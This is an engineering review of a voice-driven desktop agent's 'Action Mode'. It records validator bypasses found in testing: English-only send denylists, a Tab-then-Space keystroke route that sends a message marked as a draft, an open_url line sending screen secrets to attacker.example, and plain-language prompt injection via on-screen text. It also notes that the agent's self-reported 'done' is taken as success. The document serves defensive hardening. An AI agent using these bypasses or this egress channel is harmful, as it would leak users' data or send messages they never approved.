# Action Mode — what to fix and what to build next

**Date:** 2026-08-04 · **Against:** v0.14.1 (`7e16079`) · **Method:** code read of
the full Action Mode surface + a four-lens cross-vendor research round
(`yoyo research 20260804T130052-e30d9aad`), with every load-bearing claim
re-verified locally against the real validator.

The headline: the loop architecture is right. The weaknesses are not in the
observe→decide→act shape — they are in **what the model is allowed to address**
(bare label strings), **what the validator understands** (English words, not
capabilities), and **what counts as success** (the model's own `done`).

The strategic framing that came out of the research is worth keeping:

> Don't look for a smarter 4B. Move identity, safety, progress detection, and
> routine execution *out* of the 4B, leaving it a smaller, better-defined
> choice problem.

---

## STATUS (2026-08-04, after owner review)

**Done.** All five Part 1 defects are closed in both validators, with
regression tests on both sides (590 engine tests, 1250 Swift selftest checks).
A second adversarial review of the *fixes* found four more, all closed too:
arrow keys were the Tab hole one key over; the Swift `state(after:)`
reconstruction dropped the new transitions at the turn boundary so they
evaporated between turns; the turn-1 `done` refusal spent session budget
before raising; and Swift's folding and URL bounds had drifted from Python's.

**Deliberately NOT done** — the owner's call, and a reasonable one: *"a
deterministic layer can make it work less; unnecessary checks cause issues."*
Parts 2–4 below (snapshot refs, postconditions, typed failures, no-progress
detection, recipe cache, per-app retrieval) are **deferred, not rejected**, and
the analysis stands if that judgment changes. Everything shipped in this round
was chosen to refuse more only in degenerate cases, never to add a new
judgment the model has to satisfy.

**Accepted residuals** — real, known, and left open on purpose:

- *Space/Return can still activate a control the press denylist would refuse*,
  when no validator-tracked text is pending (e.g. the user typed a draft by
  hand before the session). Closing it needs the focused element's AX role,
  which is Part 2 work. Gating navigation keys wholesale would refuse working
  plans, which is the failure mode we care more about.
- *`open_url` remains an egress channel.* The 256-char query cap is a speed
  bump, not a closure: the path is uncapped below the 2,000-char total, and a
  plan can chunk across steps or type a URL into the address bar instead. A
  real fix is argument provenance (Part 1.3), which is deferred.
- *Cross-turn text verification.* `unverified_text` carries across turns by
  design, so `type + verify` in turn N then `Return` in turn N+1 is accepted
  even though the user may have clicked elsewhere while the model thought.
  Pre-existing and deliberate; re-arming at every boundary would cost a verify
  step in ordinary multi-turn flows.
- *Substring matching over-refuses in non-Latin scripts.* A Cyrillic or Arabic
  help link that merely *describes* deleting a message is refused, because
  those scripts get whole-label substring matching rather than word matching.
  Accepted: the alternative was no protection at all for those languages.
- *Plain-language prompt injection* is mitigated by prompt hardening and
  bounded by the locked `sends` bit, not closed.

---

## Part 1 — Confirmed defects (verified locally, not just reported)

Each was run against the shipped validator. All five are real.

### 1.1 The committing-control denylist is English-only — **highest severity**

`PRESS_DENY_WORDS` is 34 English words. On a French, German, Spanish, or
Japanese macOS the same buttons carry different labels:

```
ACCEPTED  press_element "Envoyer"    (French: Send)
ACCEPTED  press_element "Supprimer"  (French: Delete)
```

The rule "press_element is navigation only, never a committing control" is the
gate that keeps sends behind the verified keyboard path. On a localized Mac
that gate is simply absent. Velora ships worldwide.

**Fix (cheap):** stop guessing intent from the label's *language*. Read the AX
element's `AXRole`/`AXSubrole` and refuse `AXButton`-like roles inside a
composer/toolbar region regardless of wording; keep the word list as an
additional English-only heuristic, not the primary defense. Where a role check
is impossible, fail closed.

### 1.2 Tab → Space activates a control, bypassing every send gate

```
ACCEPTED  wait_frontmost Slack → type_text "secret" → key tab → key space
          ...with sends:false (an explicit DRAFT)
```

`COMMITTING_KEYS` is `("return", "enter")`. `space` is classed as *printable*,
so it arms the send gate but never trips it. On macOS, Space activates the
focused control — so Tab out of a composer onto Send, then Space, delivers the
message. It evades all three protections at once: the press denylist (no
`press_element`), the verify-before-Return gate (no Return), and the draft lock
(`sends:false` is not consulted for non-committing keys).

**Both validators accept it**, because they are faithful mirrors of the same
contract — `ActionPlan.swift:136` has the identical `committingKeys` set. This
is the important structural lesson: **dual implementation protects against
divergence, not against a hole in the shared contract.** Two mirrors of a wrong
rule are still wrong twice.

**Fix:** treat "activation" as a capability rather than a key list. Space (and
Return) on a *focused non-text element* is an activation; require the same
verify gate. Cheapest correct version: if `pending_text` and the focused role
is not a text field, refuse Space.

### 1.3 `open_url` is an unrestricted egress channel

```
ACCEPTED  open_url https://attacker.example/collect?q=SECRET_FROM_SCREEN
```

The scheme allowlist reasons about *what opening a URL does locally*, which is
why `shortcuts://` was correctly removed. It does not reason about the URL as
an outbound channel. The planner's prompt contains the user's selection, window
titles, and up to 40 on-screen labels — all of which the model can splice into
a query string. That is one step, no focus checkpoint, and no verification.

This is the mechanism by which a prompt injection becomes exfiltration rather
than mere misnavigation, which is what makes it matter more than it looks.

**Fix:** distinguish navigation from egress. Allow arbitrary URLs only when the
URL is derived from the *spoken transcript*; when a URL carries data traceable
to screen content, require confirmation or refuse. A blunt interim: cap
query-string length and refuse URLs whose query contains substrings drawn from
the selection/labels.

### 1.4 Screen text is defanged structurally, not semantically

`defang_context` neutralizes chat-template control tokens and collapses line
structure — genuinely good, and it stops the strongest attack (forging a
conversation turn). It does nothing about plain-language injection, and every
turn re-injects fresh screen text: window titles, chat contents, page text, and
the labels list.

The saving grace is real and deliberate: the closed verb vocabulary, the locked
`sends` bit, and the verify gates mean a successful injection cannot upgrade a
draft into a send. The residual is misnavigation plus 1.3's egress.

**Fix:** provenance, not better fencing. Tag every argument with where it came
from (spoken transcript vs. screen) and let the validator require that
*consequential* arguments trace to the transcript.

### 1.5 `done` is model-asserted and reported as success

`ActionLoop.swift:205` returns `.completed` on the model's own `done:true`.
Verified: a session whose only executed step is `wait_frontmost` reports
completed. Nothing checks the goal actually happened. This is a trust bug more
than a safety bug — Velora tells the user it did something it may not have.

**Fix:** deterministic postconditions per verb. "Sent" means the composer is
empty and a new row appeared; "opened" means the title changed to the target.
Fail closed to "I'm not sure that worked" rather than claiming success.

---

## Part 2 — The grounding defect (three of four lenses converged here)

Today's addressing path:

1. `visibleNames()` walks the AX tree (≤700 nodes, 1.2s) and returns **≤40 bare
   deduplicated strings**. `nameCandidate` keeps only name-shaped text — ≤4
   words, ≤40 chars, letter-heavy — so roles, hierarchy, pressability, and
   duplicate identity are all discarded.
2. The model emits a **label string**.
3. `pressElement()` walks the tree **again** (≤900 nodes, 1.5s) doing whole-word
   fuzzy matching, then climbs up to 3 ancestors hunting for something that
   advertises `AXPress`.

So the model picks from a lossy projection, and the app then re-derives the
element from a string. Two duplicate rows named "Priya Sharma" are
indistinguishable; the second walk can land on a different element than the one
that produced the label; and the app burns up to 2.7s of AX IPC per press.

**The fix everyone converged on: snapshot-bound opaque refs.** Enumerate
actionable elements once, hand the model `@e12 "Priya Sharma" (row, pressable)`,
and let it emit `press_ref @e12`. The retained `AXUIElement` is checked against
a fingerprint (role + label + ancestry) before use; a mismatch returns
`STALE_REF` and forces re-observation rather than silently fuzzy-matching
something else.

This is the same mechanism as Playwright MCP refs, browser-use indices, and
WebVoyager's Set-of-Mark — WebArena's framing is that element IDs turn grounding
from open-ended generation into **n-way classification**, which is exactly the
kind of problem a 4B model is comparatively good at.

It also fixes 1.1 for free: the ref carries the element's real role and full
title, so the denylist can judge what the control *is* rather than what the
model *called* it.

**Load-bearing unknown, flagged by two lenses:** whether `AXUIElement` handles
actually survive observation→action in Slack, WhatsApp, and Chrome. Prototype
`observe → press_ref` on one native and one Electron app before committing.

---

## Part 3 — Latency

Already done well and worth preserving: prompt-prefix KV caching across turns
(the `prefix_candidates=[(prompt,"a"),(prompt,"b")]` trick in `server.py:2296`
is genuinely clever) and the separate cold first-turn budget.

Verified available in the installed stack (`mlx_lm` 0.31.3): `logits_processors`
and `draft_model` are both exposed by `generate_step`, so grammar-constrained
decoding and speculative decoding are implementable today. No grammar library
is currently installed.

Ranked by expected value:

1. **Verified recipe cache** — the largest win, because a hit removes model
   turns *entirely*, not just prefill. Store only trajectories whose
   postconditions passed; parameterize into typed slots; replay through the
   same validator and postconditions; fall back to planning on any fingerprint
   miss. Start with one non-committing recipe ("open a named conversation").
2. **Per-app playbook retrieval** — the Slack/WhatsApp/browser hints are static
   prose in a ~2.6k-token prompt. Inject only the relevant app's playbook.
   Smaller prefill, and it scales past four apps.
3. **Kill one of the two AX walks** — falls out of Part 2 automatically.
4. **Grammar-constrained JSON** — worth an A/B, but explicitly *not* a
   reliability boundary: every bypass in Part 1 is perfectly valid JSON. Two
   lenses also warn of a "constraint tax" where constrained decoding shifts
   probability toward valid-but-wrong actions. Measure the current structural
   failure rate first — if it's near zero, this buys nothing.
5. **Speculative decoding / LoRA** — only after measurement.

---

## Part 4 — What to explicitly *not* do

The research was consistent that several fashionable mechanisms are wrong here:

- **No manager/worker hierarchy** (Agent-S2 style). Agent-S3 removed it;
  AgentOccam got +26.6 points on WebArena by *simplifying* actions and
  observations with no extra agents. Latency here is already the constraint.
- **No live best-of-N or tree search.** These need resettable environments and
  multiple complete rollouts. Desktop actions are irreversible — you cannot
  roll back a sent message to try another branch.
- **No second neural critic.** Postconditions are deterministic, cheaper, and
  actually trustworthy.
- **No vision model.** AX gives structure that visual agents work hard to
  reconstruct. The real ceiling is AX *coverage*, which vision would only
  partly address and at large latency cost.

---

## Recommended order

1. **Instrument first.** Log failure classes (malformed JSON, wrong element,
   wrong context, no-op, unsupported AX) and per-phase latency. Several
   priority arguments below are currently unmeasured — including whether
   grammar decoding is worth anything.
2. **Convert Part 1's five bypasses into regression tests, then close them.**
   Role-based press judgment, activation-as-capability, egress provenance,
   argument provenance, deterministic postconditions.
3. **Snapshot refs + typed failures** (`STALE_REF`, `AMBIGUOUS_MATCH`,
   `NO_STATE_CHANGE`, `POSTCONDITION_FAILED`). Prototype handle stability first.
4. **No-progress detection** — refuse a repeat of a failed (action, state)
   signature structurally, instead of asking a 4B model in prose not to repeat
   itself (current rule 10).
5. **A/B** grammar decoding, per-app retrieval, persistent prefix caching.
6. **Verified recipes**, narrow and non-committing to start.
7. LoRA and speculative decoding last.

---

## Claim provenance

**Verified locally in this round:** all five Part 1 bypasses (executed against
the shipped validator); the Swift/Python mirror agreement on `space`;
`done`-without-postcondition; `mlx_lm` 0.31.3 capabilities; the two-walk
addressing path and `nameCandidate`'s filtering.

**From the research, not independently verified — treat as directional:**
AgentOccam's 43.1% / +26.6 WebArena figures; OSWorld-Human's 75–94% planning
share of latency; Screen2AX's 36% of top macOS apps having high-quality AX
metadata; A11y-Compressor's token-reduction numbers (the research itself flagged
these as sourced from an author page rather than the paper body).

**Unverified transfer assumptions:** that speculative decoding yields 1.5–2×
here, that examples beat rules for this specific 4B, and the expected accuracy
gain from compressed snapshots. All hypotheses.
